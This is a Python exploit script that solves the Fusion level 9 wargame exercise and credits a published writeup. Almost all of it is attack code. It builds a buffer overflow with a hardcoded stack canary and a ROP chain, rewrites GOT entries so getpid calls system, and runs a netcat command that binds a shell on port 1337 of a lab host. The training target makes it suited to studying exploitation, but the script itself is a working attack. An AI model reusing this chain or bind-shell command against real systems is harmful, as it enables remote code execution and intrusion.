#!/usr/bin/env python
'''
big up for r3v3rs3r, this solution is partly based on his/her writeup.
https://r3v3rs3r.wordpress.com/2015/09/18/solving-fusion-level-9/
'''

import socket
from struct import *
import random
import time
import math
import struct

def rop_write_string_to_zerod_memory(str, memaddr):
	rop = ""
	for i in range(0,int(math.ceil(float(len(str))/4))):
		rop += pack("<I", 0x08060f6e) # 0x08060f6e: pop edi | pop ebp | ret
		rop += pack("<I", memaddr+i*4)
		rop += str[i*4:i*4+4]
		rop += pack("<I", 0x0805d1e3) # 0x0805d1e3: xchg ebp, ecx | ret
		rop += pack("<I", 0x0805d165) # 0x0805d165: add [edi], ecx | test dl, ah | ret

	return rop

def rop_add_to_addr(what, where):
	rop = ""
	rop += pack("<I", 0x08060f6e) # 0x08060f6e: pop edi | pop ebp | ret
	rop += pack("<I", where)
	rop += pack("<I", what)
	rop += pack("<I", 0x0805d1e3) # 0x0805d1e3: xchg ebp, ecx | ret
        rop += pack("<I", 0x0805d165) # 0x0805d165: add [edi], ecx | test dl, ah | ret
	return rop


UDP_IP = '172.16.193.195'
UDP_PORT = 20009
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((UDP_IP, UDP_PORT))

ebx = "1111" # 12
ebp = "2222" # 24
esi = "3333" # 16
edi = "4444" # 20
canary = "EQEQ"

#libc.getpid - 0x80488c0:	jmp    *0x80632a0
#(gdb) x/w 0x80632a0
#0x80632a0:	0xb76c9380
#0xb76c9380-0x5f860 -> system! (+0xfffa07a0)

#lib.setsockopt - 0x8048820:	jmp    *0x8063278
#(gdb) x/w 0x8063278
#0x8063278:	0xb775da70
#0xb775da70-0xa1090 -> exit! (+0xfff5ef70)

command_addr = 0x08063010 # memory in libc filled with nulls
kvsyscall_addr = 0x080632f0
kvsyscall = pack("<I", 0x08048a00)

rop = ""
rop += rop_write_string_to_zerod_memory("/bin/nc.traditional -ltp 1337 -e/bin//sh", command_addr)
rop += rop_add_to_addr(0xfffa07a0, 0x080632a0) # getpid pointer modify to system
rop += rop_add_to_addr(0xfff5ef70, 0x08063278) # setsockopt pointer modify to exit
rop += rop_add_to_addr(0xef904, kvsyscall_addr) # socket pointer modify to __kernel_vsyscall

rop += pack("<I", 0x80488c0) # original getpid - modified to system
rop += pack("<I", 0x8048820) # original setsockopt - modified to exit
rop += pack("<I", command_addr)

bof = "E"*66+canary+"C"*12+ebx+esi+edi+ebp+rop+"D"*(2052-len(rop))+kvsyscall+ canary

s.send("\x1f\x0e"+bof)
s.close()


